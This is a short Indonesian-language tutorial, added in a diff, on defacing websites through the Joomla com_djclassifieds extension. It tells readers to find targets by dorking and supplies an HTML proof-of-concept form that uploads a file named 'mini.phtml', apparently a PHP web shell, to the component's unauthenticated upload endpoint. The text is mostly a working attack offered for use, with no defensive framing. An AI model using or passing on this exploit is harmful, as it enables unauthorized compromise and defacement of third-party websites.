@@ -1,0 +1,17 @@
+• Cara Deface Poc Jomla com_DjClasifends
+
+- Bahan - Bahan
+- HP / PC (bebas) 
+- Kouta
+- Tols
+- Script Deface
+- Kopi
+- Ke sabaran
+
+OK LAH LANGSUNG KE TUTOR NYA
+
+Seperti Biasa Kita Nge Dorking Dulu
+( cari target ) 
+
+
+<html><body><form method="post" action="https://site.Lo/index.php?option=com_djclassifieds&task=upload&tmpl=component" enctype="multipart/form-data"><input type="file" name="file"/><input type="hidden" name="name" value="mini.phtml" /><input type="submit" value="submit"/></form></body></html>
